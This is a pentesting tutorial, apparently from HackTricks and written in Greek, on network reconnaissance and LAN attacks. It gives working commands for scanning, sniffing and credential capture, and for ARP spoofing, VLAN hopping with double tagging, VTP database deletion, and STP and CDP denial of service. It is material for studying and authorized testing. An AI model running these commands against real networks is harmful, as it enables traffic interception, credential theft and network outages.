# Pentesting Δίκτυο

{{#include ../../banners/hacktricks-training.md}}



## Εντοπισμός hosts από το εξωτερικό

Αυτή θα είναι μια **σύντομη ενότητα** για το πώς να βρείτε **IPs που απαντούν** από το **Διαδίκτυο**.\
Σε αυτή την περίπτωση έχετε κάποιο **scope of IPs** (ίσως και αρκετά **ranges**) και απλώς θέλετε να βρείτε **ποια IPs απαντούν**.

### ICMP

Αυτή είναι η **πιο εύκολη** και **πιο γρήγορη** μέθοδος για να διαπιστώσετε αν ένας host είναι up ή όχι.\
Μπορείτε να δοκιμάσετε να στείλετε μερικά **ICMP** πακέτα και να **περιμένετε απαντήσεις**. Ο πιο απλός τρόπος είναι απλά να στείλετε ένα **echo request** και να περιμένετε την απάντηση. Μπορείτε να το κάνετε με ένα απλό `ping` ή χρησιμοποιώντας `fping` για **ranges**.\
Μπορείτε επίσης να χρησιμοποιήσετε το **nmap** για να στείλετε άλλους τύπους ICMP πακέτων (αυτό θα αποφύγει φίλτρα στις κοινές ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Είναι πολύ συνηθισμένο να διαπιστώσεις ότι όλα τα είδη πακέτων ICMP φιλτράρονται. Τότε, το μόνο που μπορείς να κάνεις για να ελέγξεις αν ένας host είναι up είναι να **προσπαθήσεις να εντοπίσεις open ports**. Κάθε host έχει **65535 ports**, οπότε, αν έχεις ένα «μεγάλο» scope **δεν μπορείς** να ελέγξεις αν **κάθε port** κάθε host είναι open ή όχι, θα πάρει πάρα πολύ χρόνο.\
Άρα, αυτό που χρειάζεσαι είναι ένας **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) και μια λίστα με τις **πιο συχνά χρησιμοποιούμενες ports:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Μπορείτε επίσης να εκτελέσετε αυτό το βήμα με `nmap`, αλλά είναι πιο αργό και το `nmap` έχει προβλήματα στο να εντοπίζει hosts up.

### HTTP Ανακάλυψη θυρών

Αυτή είναι απλώς μια TCP ανακάλυψη θυρών χρήσιμη όταν θέλετε να **εστιάσετε στην ανακάλυψη HTTP** **υπηρεσιών**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Μπορείτε επίσης να δοκιμάσετε να ελέγξετε για κάποιο **UDP port open** για να αποφασίσετε αν πρέπει να **δώσετε περισσότερη προσοχή** σε έναν **host.** Εφόσον οι UDP services συνήθως **δεν αποκρίνονται** με **καμία πληροφορία** σε ένα κανονικό άδειο UDP probe packet, είναι δύσκολο να πούμε αν ένα port είναι filtered ή open. Ο ευκολότερος τρόπος για να αποφασίσετε αυτό είναι να στείλετε ένα packet σχετικό με την υπηρεσία που τρέχει, και επειδή δεν ξέρετε ποια υπηρεσία τρέχει, πρέπει να δοκιμάσετε τις πιο πιθανές βάσει του αριθμού του port:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Η γραμμή nmap που προτάθηκε προηγουμένως θα ελέγξει τις **top 1000 UDP ports** σε κάθε host εντός του εύρους **/24**, αλλά ακόμη και αυτό θα χρειαστεί **>20min**. Αν χρειάζεστε **ταχύτερα αποτελέσματα** μπορείτε να χρησιμοποιήσετε [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Αυτό θα στείλει αυτές τις **UDP probes** στις **αναμενόμενες θύρες** τους (για εύρος /24 αυτό θα πάρει μόλις 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Εδώ μπορείτε να βρείτε έναν καλό οδηγό για όλες τις well known Wifi attacks κατά το χρόνο συγγραφής:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Ανακάλυψη hosts από το εσωτερικό

Εάν βρίσκεστε μέσα στο δίκτυο, ένα από τα πρώτα πράγματα που θα θέλετε να κάνετε είναι να **ανακαλύψετε άλλους hosts**. Ανάλογα με **πόσο θόρυβο** μπορείτε/θέλετε να κάνετε, μπορούν να εκτελεστούν διαφορετικές ενέργειες:

### Παθητικό

Μπορείτε να χρησιμοποιήσετε αυτά τα εργαλεία για να ανακαλύψετε παθητικά hosts μέσα σε ένα συνδεδεμένο δίκτυο:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Ενεργό

Σημειώστε ότι οι τεχνικές που σχολιάζονται στο [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) μπορούν επίσης να **εφαρμοστούν εδώ**.\
Αλλά, καθώς βρίσκεστε στο **ίδιο δίκτυο** με τους υπόλοιπους hosts, μπορείτε να κάνετε **περισσότερα πράγματα**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Ενεργό ICMP

Σημειώστε ότι οι τεχνικές που σχολιάζονται στο _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) μπορούν επίσης να **εφαρμοστούν εδώ**.\
Αλλά, καθώς βρίσκεστε στο **ίδιο δίκτυο** με τους άλλους hosts, μπορείτε να κάνετε **περισσότερα**:

- Αν κάνετε **ping** σε μια **subnet broadcast address** το ping θα πρέπει να φτάσει σε **κάθε host** και μπορούν να **απαντήσουν** σε **εσάς**: `ping -b 10.10.5.255`
- Κάνοντας ping στη **network broadcast address** μπορείτε ακόμα να βρείτε hosts μέσα σε **άλλα subnets**: `ping -b 255.255.255.255`
- Χρησιμοποιήστε τις σημαίες `-PE`, `-PP`, `-PM` του `nmap`to perform host discovery sending respectively **ICMPv4 echo**, **timestamp**, and **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan χρησιμοποιείται για να **ανάβετε** υπολογιστές μέσω ενός **network message**. Το magic packet που χρησιμοποιείται για να ανάψει ο υπολογιστής είναι απλώς ένα πακέτο όπου παρέχεται μια **MAC Dst** και στη συνέχεια **επαναλαμβάνεται 16 φορές** μέσα στο ίδιο paket.\
Στη συνέχεια τέτοιου είδους πακέτα συνήθως αποστέλλονται σε ένα **ethernet 0x0842** ή σε ένα **UDP packet to port 9**.\
Αν **δεν δοθεί \[MAC]**, το πακέτο αποστέλλεται στο **broadcast ethernet** (και το broadcast MAC θα είναι αυτό που επαναλαμβάνεται).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Σάρωση Hosts

Μόλις έχετε εντοπίσει όλες τις IPs (εξωτερικές ή εσωτερικές) που θέλετε να σαρώσετε σε βάθος, μπορούν να εκτελεστούν διάφορες ενέργειες.

### TCP

- **Ανοιχτή** port: _SYN --> SYN/ACK --> RST_
- **Κλειστή** port: _SYN --> RST/ACK_
- **Φιλτραρισμένη** port: _SYN --> \[NO RESPONSE]_
- **Φιλτραρισμένη** port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Υπάρχουν 2 επιλογές για να σαρώσετε μια UDP θύρα:

- Αποστείλετε ένα **UDP packet** και ελέγξτε για την απάντηση _**ICMP unreachable**_ αν η θύρα είναι **closed** (σε πολλές περιπτώσεις το ICMP θα είναι **filtered**, οπότε δεν θα λάβετε καμία πληροφορία αν η θύρα είναι **closed** ή **open**).
- Αποστείλετε **formatted datagrams** για να προκαλέσετε μια απάντηση από μια **service** (π.χ., DNS, DHCP, TFTP και άλλες, όπως καταγράφονται στο _nmap-payloads_). Αν λάβετε μια **response**, τότε η θύρα είναι **open**.

**Nmap** θα **mix both** τις επιλογές χρησιμοποιώντας "-sV" (UDP scans are very slow), αλλά σημειώστε ότι UDP scans είναι πιο αργές από TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** έχει σχεδιαστεί για να χρησιμοποιείται μαζί με **TCP (Transmission Control Protocol)** και **UDP (User Datagram Protocol)**. Ο κύριος σκοπός του είναι να διευκολύνει τη μεταφορά δεδομένων τηλεφωνίας μέσω δικτύων IP, αντανακλώντας πολλά από τα χαρακτηριστικά αξιοπιστίας που βρίσκονται στο **Signaling System 7 (SS7)**. **SCTP** είναι βασικό συστατικό της οικογένειας πρωτοκόλλων **SIGTRAN**, που στοχεύει στη μεταφορά σημάτων SS7 μέσω δικτύων IP.

Η υποστήριξη για **SCTP** παρέχεται από διάφορα λειτουργικά συστήματα, όπως **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, και **VxWorks**, υποδεικνύοντας την ευρεία αποδοχή και χρησιμότητά του στον τομέα των τηλεπικοινωνιών και των δικτύων.

Two different scans for SCTP are offered by nmap: _-sY_ and _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **More nmap options**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Αποκάλυψη Εσωτερικών Διευθύνσεων IP

**Misconfigured routers, firewalls, and network devices** μερικές φορές ανταποκρίνονται σε probes δικτύου χρησιμοποιώντας **nonpublic source addresses**. **tcpdump** μπορεί να χρησιμοποιηθεί για να εντοπίσει πακέτα που λαμβάνονται από ιδιωτικές διευθύνσεις κατά τη διάρκεια δοκιμών. Συγκεκριμένα, σε **Kali Linux**, πακέτα μπορούν να καταγραφούν στην **eth2 interface**, η οποία είναι προσβάσιμη από το δημόσιο Internet. Είναι σημαντικό να σημειωθεί ότι αν η εγκατάστασή σας βρίσκεται πίσω από ένα **NAT** ή ένα **Firewall**, τέτοια πακέτα πιθανότατα θα φιλτραριστούν.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Με το Sniffing μπορείτε να μάθετε λεπτομέρειες για IP ranges, subnet sizes, MAC addresses και hostnames αναλύοντας captured frames και packets. Αν το δίκτυο είναι misconfigured ή το switching fabric under stress, attackers μπορούν να αποσπάσουν ευαίσθητο υλικό μέσω passive network sniffing.

Αν ένα switched Ethernet network είναι configured properly, θα βλέπετε μόνο broadcast frames και υλικό προοριζόμενο για τη MAC address σας.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Μπορεί επίσης κανείς να καταγράψει πακέτα από μια απομακρυσμένη μηχανή μέσω συνεδρίας SSH με το Wireshark ως GUI σε πραγματικό χρόνο.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Προφανώς.

### Καταγραφή διαπιστευτηρίων

Μπορείς να χρησιμοποιήσεις εργαλεία όπως [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) για να εξάγεις διαπιστευτήρια από ένα pcap ή από ένα live interface.

## Επιθέσεις LAN

### ARP spoofing

ARP Spoofing συνίσταται στην αποστολή gratuitous ARPResponses για να δηλώσει ότι το IP ενός μηχανήματος έχει το MAC της συσκευής μας. Στη συνέχεια, το θύμα θα αλλάξει τον πίνακα ARP και θα επικοινωνεί με τη μηχανή μας κάθε φορά που θέλει να προσεγγίσει το IP που έγινε spoof.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Πλημμυρίστε τον CAM table του switch στέλνοντας πολλά πακέτα με διαφορετική source mac address. Όταν ο CAM table είναι γεμάτος, το switch αρχίζει να συμπεριφέρεται σαν hub (broadcasting all the traffic).
```bash
macof -i <interface>
```
Σε σύγχρονα switches αυτή η ευπάθεια έχει διορθωθεί.

### 802.1Q VLAN / DTP Επιθέσεις

#### Dynamic Trunking

Το **Dynamic Trunking Protocol (DTP)** σχεδιάστηκε ως πρωτόκολλο link layer για να διευκολύνει ένα αυτόματο σύστημα για trunking, επιτρέποντας στα switches να επιλέγουν αυτόματα θύρες για trunk mode (Trunk) ή μη-trunk mode. Η χρήση του **DTP** συχνά θεωρείται ένδειξη υποβέλτιστης σχεδίασης δικτύου, υπογραμμίζοντας τη σημασία της χειροκίνητης ρύθμισης των trunks μόνο όπου είναι απαραίτητο και της σωστής τεκμηρίωσης.

Από προεπιλογή, οι θύρες του switch έχουν ρυθμιστεί να λειτουργούν σε Dynamic Auto mode, δηλαδή είναι έτοιμες να ξεκινήσουν trunking αν ερωτηθούν από γειτονικό switch. Πρόβλημα ασφάλειας προκύπτει όταν ένας pentester ή attacker συνδεθεί στο switch και στείλει ένα DTP Desirable frame, αναγκάζοντας τη θύρα να μπει σε trunk mode. Αυτή η ενέργεια επιτρέπει στον attacker να απαριθμήσει VLANs μέσω ανάλυσης STP frames και να παρακάμψει το VLAN segmentation δημιουργώντας virtual interfaces.

Η παρουσία του DTP σε πολλά switches από προεπιλογή μπορεί να αξιοποιηθεί από αντιπάλους για να μιμηθούν τη συμπεριφορά ενός switch, αποκτώντας έτσι πρόσβαση στην κυκλοφορία σε όλα τα VLANs. Το script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) χρησιμοποιείται για την παρακολούθηση μιας διεπαφής, αποκαλύπτοντας αν ένα switch βρίσκεται σε Default, Trunk, Dynamic, Auto ή Access mode — το τελευταίο είναι η μόνη ρύθμιση που είναι ανθεκτική σε VLAN hopping attacks. Αυτό το εργαλείο αξιολογεί την ευπάθεια του switch.

Αν εντοπιστεί ευπάθεια στο δίκτυο, το εργαλείο _**Yersinia**_ μπορεί να χρησιμοποιηθεί για να "enable trunking" μέσω του πρωτοκόλλου DTP, επιτρέποντας την παρατήρηση πακέτων από όλα τα VLANs.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Για να απαριθμήσετε τα VLANs, είναι επίσης δυνατό να δημιουργήσετε το DTP Desirable frame με το script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py). **Μην διακόπτετε το script με κανέναν τρόπο.** Στέλνει το DTP Desirable κάθε τρία δευτερόλεπτα. **Τα δυναμικά δημιουργημένα trunk κανάλια στο switch διαρκούν μόνο πέντε λεπτά. Μετά από πέντε λεπτά, το trunk πέφτει.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Θα ήθελα να επισημάνω ότι **Access/Desirable (0x03)** υποδεικνύει ότι το DTP frame είναι του τύπου Desirable, το οποίο λέει στη θύρα να μεταβεί σε Trunk mode. Και **802.1Q/802.1Q (0xa5** υποδεικνύει τον τύπο encapsulation **802.1Q**.

Αναλύοντας τα STP frames, **μαθαίνουμε για την ύπαρξη των VLAN 30 και VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Επίθεση σε συγκεκριμένα VLAN

Μόλις γνωρίζετε τα VLAN IDs και τις τιμές IP, μπορείτε να **διαμορφώσετε μια εικονική διεπαφή για να επιτεθείτε σε ένα συγκεκριμένο VLAN**.\
Εάν το DHCP δεν είναι διαθέσιμο, τότε χρησιμοποιήστε _ifconfig_ για να ορίσετε μια στατική διεύθυνση IP.

<details>
<summary>Διαμόρφωση διεπαφής VLAN (παράδειγμα)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Η συζητημένη επίθεση του **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** άλλων VLANs εκτελείται **αυτόματα** από το εργαλείο: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Αν ένας επιτιθέμενος γνωρίζει την τιμή του **MAC, IP and VLAN ID του θύματος**, μπορεί να προσπαθήσει να **double tag a frame** με το καθορισμένο VLAN του και το VLAN του θύματος και να στείλει ένα πακέτο. Καθώς το **θύμα δεν θα μπορέσει να συνδεθεί πίσω** με τον επιτιθέμενο, η **καλύτερη επιλογή για τον επιτιθέμενο είναι να επικοινωνήσει μέσω UDP** με πρωτόκολλα που μπορούν να εκτελέσουν ενδιαφέρουσες ενέργειες (όπως SNMP).

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probably through internet). Then, the attacker could sniff in the second host owned by him if it receives some packets from the victim.

![](<../../images/image (190).png>)

Για να εκτελέσετε αυτή την επίθεση μπορείτε να χρησιμοποιήσετε το scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

If you have **access to a switch that you are directly connected to**, you have the ability to **bypass VLAN segmentation** within the network. Simply **switch the port to trunk mode** (otherwise known as trunk), create virtual interfaces with the IDs of the target VLANs, and configure an IP address. You can try requesting the address dynamically (DHCP) or you can configure it statically. It depends on the case.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

Σε ορισμένα περιβάλλοντα, όπως guest wireless networks, εφαρμόζονται ρυθμίσεις **port isolation (also known as private VLAN)** για να αποτρέπεται η άμεση επικοινωνία μεταξύ clients που είναι συνδεδεμένοι σε ένα wireless access point. Ωστόσο, έχει εντοπιστεί μια τεχνική που μπορεί να παρακάμψει αυτά τα μέτρα απομόνωσης. Η τεχνική εκμεταλλεύεται είτε την έλλειψη network ACLs είτε την λανθασμένη διαμόρφωσή τους, επιτρέποντας στα IP packets να δρομολογηθούν μέσω ενός router ώστε να φτάσουν σε άλλο client στο ίδιο δίκτυο.

Η επίθεση εκτελείται δημιουργώντας ένα **packet that carries the IP address of the destination client but with the router's MAC address**. Αυτό προκαλεί το router να προωθήσει λανθασμένα το packet προς τον στοχευμένο client. Η προσέγγιση αυτή είναι παρόμοια με αυτή που χρησιμοποιείται στις Double Tagging Attacks, όπου η δυνατότητα ελέγχου ενός host προσβάσιμου από το θύμα αξιοποιείται για να εκμεταλλευτεί την ευπάθεια.

Key Steps of the Attack:

1. **Crafting a Packet:** Ένα packet κατασκευάζεται ειδικά ώστε να περιλαμβάνει τη διεύθυνση IP του στοχευόμενου client αλλά με το MAC address του router.
2. **Exploiting Router Behavior:** Το crafted packet αποστέλλεται προς το router, το οποίο, λόγω της διαμόρφωσης, ανακατευθύνει το packet στον στοχευόμενο client, παρακάμπτοντας την απομόνωση που παρέχουν οι private VLAN ρυθμίσεις.

### VTP Attacks

VTP (VLAN Trunking Protocol) κεντρικοποιεί τη διαχείριση των VLAN. Χρησιμοποιεί revision numbers για να διατηρεί την ακεραιότητα της VLAN database· οποιαδήποτε τροποποίηση αυξάνει αυτόν τον αριθμό. Τα switches υιοθετούν τις ρυθμίσεις με υψηλότερους revision numbers, ενημερώνοντας τις δικές τους VLAN databases.

#### VTP Domain Roles

- **VTP Server:** Διαχειρίζεται τα VLAN—δημιουργεί, διαγράφει, τροποποιεί. Εκπέμπει VTP announcements στα μέλη του domain.
- **VTP Client:** Λαμβάνει VTP announcements για να συγχρονίσει τη VLAN database του. Αυτός ο ρόλος δεν επιτρέπει τοπικές τροποποιήσεις στη διαμόρφωση VLAN.
- **VTP Transparent:** Δεν συμμετέχει σε VTP updates αλλά προωθεί τα VTP announcements. Δεν επηρεάζεται από VTP attacks και διατηρεί σταθερό revision number μηδέν.

#### VTP Advertisement Types

- **Summary Advertisement:** Εκπέμπεται από τον VTP server κάθε 300 δευτερόλεπτα και μεταφέρει βασικές πληροφορίες του domain.
- **Subset Advertisement:** Αποστέλλεται μετά από αλλαγές στη διαμόρφωση VLAN.
- **Advertisement Request:** Εκδίδεται από έναν VTP client για να ζητήσει ένα Summary Advertisement, συνήθως ως απάντηση στην ανίχνευση ενός υψηλότερου configuration revision number.

Οι ευπάθειες του VTP εκμεταλλεύονται αποκλειστικά μέσω trunk ports, καθώς τα VTP announcements κυκλοφορούν μόνο μέσα από αυτά. Σε σενάρια μετά από DTP επιθέσεις, μπορεί να στραφεί προσοχή στο VTP. Εργαλεία όπως το Yersinia μπορούν να διευκολύνουν VTP attacks, με στόχο τη διαγραφή της VLAN database, διαταράσσοντας ουσιαστικά το δίκτυο.

Note: This discussion pertains to VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Στη γραφική λειτουργία του Yersinia, επιλέξτε την επιλογή deleting all VTP vlans για να εκκαθαρίσετε τη βάση δεδομένων VLAN.

### STP Επιθέσεις

**Εάν δεν μπορείτε να καταγράψετε πλαίσια BPDU στις διεπαφές σας, είναι απίθανο να πετύχετε σε επίθεση STP.**

#### **STP BPDU DoS**

Η αποστολή μεγάλου αριθμού BPDUs TCP (Topology Change Notification) ή Conf (τα BPDUs που αποστέλλονται όταν δημιουργείται η τοπολογία) υπερφορτώνει τα switches και αυτά σταματούν να λειτουργούν σωστά.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Όταν αποστέλλεται ένα TCP, ο πίνακας CAM των switches θα διαγραφεί σε 15s. Έπειτα, αν στέλνετε συνεχώς αυτό το είδος πακέτων, ο πίνακας CAM θα επανεκκινείται συνεχώς (ή κάθε 15segs) και όταν επανεκκινήσει, ο switch συμπεριφέρεται ως hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Ο επιτιθέμενος προσομοιώνει τη συμπεριφορά ενός switch για να γίνει ο STP root του δικτύου. Έτσι, περισσότερα δεδομένα θα διακινούνται μέσω αυτού. Αυτό είναι ενδιαφέρον όταν είστε συνδεδεμένοι σε δύο διαφορετικά switches.\
Αυτό επιτυγχάνεται στέλνοντας πακέτα BPDUs CONF που αναφέρουν ότι η τιμή του **priority** είναι μικρότερη από την πραγματική τιμή του root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Εάν ο attacker είναι συνδεδεμένος σε 2 switches μπορεί να γίνει root του νέου δέντρου και όλη η κίνηση μεταξύ αυτών των switches θα περνάει μέσω αυτού** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) είναι απαραίτητο για την επικοινωνία μεταξύ CISCO devices, επιτρέποντάς τους να **αναγνωρίζουν η μία την άλλη και να μοιράζονται λεπτομέρειες διαμόρφωσης**.

#### Παθητική Συλλογή Δεδομένων <a href="#id-0e0f" id="id-0e0f"></a>

Το CDP είναι ρυθμισμένο να εκπέμπει πληροφορίες μέσω όλων των θυρών, κάτι που μπορεί να οδηγήσει σε κίνδυνο ασφάλειας. Ένας επιτιθέμενος, συνδεόμενος σε μια θύρα switch, μπορεί να αναπτύξει network sniffers όπως **Wireshark**, **tcpdump**, ή **Yersinia**. Αυτή η ενέργεια μπορεί να αποκαλύψει ευαίσθητα δεδομένα για τη συσκευή δικτύου, συμπεριλαμβανομένου του μοντέλου της και της έκδοσης του Cisco IOS που τρέχει. Ο επιτιθέμενος μπορεί στη συνέχεια να στοχεύσει συγκεκριμένες ευπάθειες στην εντοπισμένη έκδοση του Cisco IOS.

#### Πρόκληση Πλημμύρας στον Πίνακα CDP <a href="#id-0d6a" id="id-0d6a"></a>

Μια πιο επιθετική προσέγγιση περιλαμβάνει την εκτέλεση μιας επίθεσης Denial of Service (DoS) υπερφορτώνοντας τη μνήμη του switch, προσποιούμενη ότι είναι νόμιμες συσκευές CISCO. Παρακάτω φαίνεται η ακολουθία εντολών για την έναρξη μιας τέτοιας επίθεσης χρησιμοποιώντας το Yersinia, ένα εργαλείο δικτύου σχεδιασμένο για δοκιμές:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Κατά τη διάρκεια αυτής της επίθεσης, η CPU του switch και ο πίνακας γειτόνων CDP επιβαρύνονται έντονα, οδηγώντας σε αυτό που συχνά αναφέρεται ως **“παράλυση του δικτύου”** λόγω της υπερβολικής κατανάλωσης πόρων.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Επιθέσεις VoIP και το εργαλείο VoIP Hopper

